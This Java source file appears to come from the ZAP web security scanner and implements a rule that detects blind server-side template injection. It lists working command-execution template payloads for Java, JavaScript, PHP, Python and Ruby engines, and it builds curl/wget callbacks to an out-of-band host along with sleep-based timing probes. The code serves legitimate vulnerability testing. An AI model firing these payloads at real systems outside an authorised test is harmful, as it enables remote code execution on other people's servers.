/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2022 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules;

import java.io.IOException;
import java.net.SocketException;
import java.util.concurrent.atomic.AtomicReference;
import org.apache.commons.configuration.ConversionException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.Plugin;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.timing.TimingUtils;
import org.zaproxy.addon.oast.ExtensionOast;
import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;
import org.zaproxy.zap.model.Tech;

/**
 * Active Plugin for Server Side Template Injection testing and verification.
 *
 * @author DiogoMRSilva (2019)
 */
public class SstiBlindScanRule extends AbstractAppParamPlugin implements CommonActiveScanRuleInfo {

    /** Prefix for internationalised messages used by this rule */
    private static final String MESSAGE_PREFIX = "ascanrules.sstiblind.";

    private static final String SECONDS_PLACEHOLDER = "X_SECONDS_X";

    // Most of the exploits have been created by James Kettle @albinowax and the Tplmap creator

    private static final String[] JAVA_COMMAND_EXEC_PAYLOADS = {
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"X_COMMAND_X\") }", // javaFreemarker https://portswigger.net/blog/server-side-template-injection
        "#set($engine=\"\")\n"
                + "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\n"
                + "#set($null=$proc.waitFor())\n"
                + "${null}" // javaVelocity
        // https://portswigger.net/blog/server-side-template-injection
    };

    private static final String[] JAVASCRIPT_COMMAND_EXEC_PAYLOADS = {
        "{{= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString() }}", // Javascript dot
        "<%= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()%>", // Javascript EJS
        "#{global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()}", // Javascript jade
        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()\\\")\")()}}" // Javascript Nunjucks
    };

    private static final String[] PHP_COMMAND_EXEC_PAYLOADS = {
        "{system(\"X_COMMAND_X\")}", // PHP smarty
    };

    private static final String[] PYTHON_COMMAND_EXEC_PAYLOADS = {
        "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"X_COMMAND_X\")}}", // python3 jinja2 possibly doesn't work
        "${__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}", // python Mako
        "{{__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}}", // Python
        // Tornado
    };

    private static final String[] RUBY_COMMAND_EXEC_PAYLOADS = {
        "<%=%x(X_COMMAND_X)%>", // Ruby ERB
        "#{%x(X_COMMAND_X)}" // Ruby Slims
    };

    private static final String[] WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE = {
        "curl X_URL_X", "wget X_URL_X"
    };

    /** The default number of seconds used in time-based attacks (i.e. sleep commands). */
    private static final int DEFAULT_SLEEP_TIME = 5;

    // limit the maximum number of requests sent for time-based attack detection
    private static final int BLIND_REQUESTS_LIMIT = 4;

    // error range allowable for statistical time-based blind attacks (0-1.0)
    private static final double TIME_CORRELATION_ERROR_RANGE = 0.15;
    private static final double TIME_SLOPE_ERROR_RANGE = 0.30;

    private int timeSleepSeconds = DEFAULT_SLEEP_TIME;

    private static final Logger LOGGER = LogManager.getLogger(SstiBlindScanRule.class);

    @Override
    public int getId() {
        return 90036;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public int getCweId() {
        return 74; // CWE - 74 : Failure to Sanitize Data into a Different Plane ('Injection')
    }

    @Override
    public int getWascId() {
        return 20; // WASC-20: Improper Input Handling
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    public void setSleepInSeconds(int sleep) {
        this.timeSleepSeconds = sleep;
    }

    @Override
    public void init() {
        LOGGER.debug("Initializing");
        try {
            this.timeSleepSeconds =
                    this.getConfig()
                            .getInt(RuleConfigParam.RULE_COMMON_SLEEP_TIME, DEFAULT_SLEEP_TIME);
        } catch (ConversionException e) {
            LOGGER.debug(
                    "Invalid value for 'rules.common.sleep': {}",
                    this.getConfig().getString(RuleConfigParam.RULE_COMMON_SLEEP_TIME));
        }
        LOGGER.debug("Sleep set to {} seconds", timeSleepSeconds);
    }

    @Override
    public void scan(HttpMessage msg, String paramName, String value) {
        if (inScope(Tech.JAVA)) {
            sendPayloadsToMakeCallBack(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.JAVASCRIPT)) {
            sendPayloadsToMakeCallBack(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.PYTHON)) {
            sendPayloadsToMakeCallBack(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.RUBY)) {
            sendPayloadsToMakeCallBack(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.PHP)) {
            sendPayloadsToMakeCallBack(paramName, PHP_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, PHP_COMMAND_EXEC_PAYLOADS);
        }
    }

    /**
     * Tries to inject template code that will cause a time delay in the case of being rendered
     *
     * @param paramName the name of the parameter where to search for our injection
     * @param commandExecPayloads the payloads that can possibly execute commands, they need to have
     *     the word X_COMMAND_X in the place where the command should be inserted
     */
    private void timeBasedTests(String paramName, String[] commandExecPayloads) {

        String payloadFormat;
        for (String sstiFormatPayload : commandExecPayloads) {
            payloadFormat = sstiFormatPayload.replace("X_COMMAND_X", "sleep X_SECONDS_X");
            if (checkIfCausesTimeDelay(paramName, payloadFormat)) {
                return;
            }
        }
        // TODO make more requests using other ways of delaying a response
    }

    /**
     * Check if the given payloadFormat causes an time delay in the server
     *
     * @param paramName the name of the parameter where to search for or injection
     * @param payloadFormat format string that when formated with 1 argument makes a string that may
     *     cause a delay equal to the number of second inserted by the format
     */
    private boolean checkIfCausesTimeDelay(String paramName, String payloadFormat) {
        AtomicReference<HttpMessage> message = new AtomicReference<>();
        AtomicReference<String> attack = new AtomicReference<>();
        TimingUtils.RequestSender requestSender =
                x -> {
                    HttpMessage msg = getNewMsg();
                    message.compareAndSet(null, msg);

                    String finalPayload =
                            payloadFormat.replace(SECONDS_PLACEHOLDER, Integer.toString((int) x));

                    setParameter(msg, paramName, finalPayload);
                    LOGGER.debug("Testing [{}] = [{}]", paramName, finalPayload);

                    attack.compareAndSet(null, finalPayload);
                    sendAndReceive(msg, false);
                    return msg.getTimeElapsedMillis() / 1000.0;
                };

        try {
            boolean injectable =
                    TimingUtils.checkTimingDependence(
                            BLIND_REQUESTS_LIMIT,
                            timeSleepSeconds,
                            requestSender,
                            TIME_CORRELATION_ERROR_RANGE,
                            TIME_SLOPE_ERROR_RANGE);

            if (injectable) {
                LOGGER.debug(
                        "[Time Based SSTI Found] on parameter [{}] with value [{}]",
                        paramName,
                        attack.get());

                // raise the alert
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_HIGH)
                        .setUri(getBaseMsg().getRequestHeader().getURI().toString())
                        .setParam(paramName)
                        .setAttack(attack.get())
                        .setMessage(message.get())
                        .raise();
                return true;
            }
        } catch (SocketException ex) {
            LOGGER.debug(
                    "Caught {} {} when accessing: {}",
                    ex.getClass().getName(),
                    ex.getMessage(),
                    message.get().getRequestHeader().getURI());
        } catch (IOException ex) {
            LOGGER.warn(
                    "SSTI vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                    paramName,
                    attack.get(),
                    ex);
        }
        return false;
    }

    /**
     * Function tries to make system commands that call back to ZAP.
     *
     * @param paramName the name of the parameter will be used for testing for injection
     * @param commandExecPayloads the payloads that can possibly execute commands, they need to be
     *     format strings
     */
    private void sendPayloadsToMakeCallBack(String paramName, String[] commandExecPayloads) {

        int allowedNumberCommands = 0;
        // whe should only run this scanner when the level is High, util then
        // just time based attacks should be used because of the limitations
        // in requests numbers
        if (this.getAttackStrength() == Plugin.AttackStrength.HIGH) {
            allowedNumberCommands = 1;
        } else if (this.getAttackStrength() == Plugin.AttackStrength.INSANE) {
            allowedNumberCommands = 999;
        }

        int numberCommandsSent = 0;

        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);

        if (extOast == null) {
            LOGGER.info("Could not use extension OAST in blind SSTI scan rule");
            return;
        }

        for (String requestCmd : WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE) {
            if (numberCommandsSent >= allowedNumberCommands) {
                break;
            }
            numberCommandsSent += 1;
            for (String sstiFormatPayload : commandExecPayloads) {
                Alert alert =
                        newAlert()
                                .setUri(getBaseMsg().getRequestHeader().getURI().toString())
                                .setConfidence(Alert.CONFIDENCE_HIGH)
                                .setSource(Alert.Source.ACTIVE)
                                .setParam(paramName)
                                .setOtherInfo(
                                        Constant.messages.getString(
                                                MESSAGE_PREFIX + "alert.recvdcallback.otherinfo"))
                                .build();

                String url;
                if (extOast.getActiveScanOastService() != null) {
                    try {
                        url = "http://" + extOast.registerAlertAndGetPayload(alert);
                    } catch (Exception e) {
                        LOGGER.warn("Failed to register callback on oast", e);
                        return;
                    }
                } else if (extOast.getCallbackService() != null) {
                    url =
                            extOast.registerAlertAndGetPayloadForCallbackService(
                                    alert, SstiBlindScanRule.class.getSimpleName());
                } else {
                    LOGGER.info("Could not use extension OAST on blind SSTI scan rule");
                    return;
                }

                String payload =
                        sstiFormatPayload
                                .replace("X_COMMAND_X", requestCmd)
                                .replace("X_URL_X", url);
                // TODO split the url to avoid FPs
                HttpMessage msg = getNewMsg();
                setParameter(msg, paramName, payload);
                alert.setMessage(msg);
                alert.setAttack(payload);

                try {
                    sendAndReceive(msg, false);
                } catch (SocketException ex) {
                    LOGGER.debug(
                            "Caught {} {} when accessing: {}",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            msg.getRequestHeader().getURI());
                } catch (IOException ex) {
                    LOGGER.warn(
                            "SSTI vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                            paramName,
                            payload,
                            ex);
                } catch (Exception ex) {
                    LOGGER.error("Failed SSTI rule with payload [{}]", payload, ex);
                }
            }
        }
    }
}
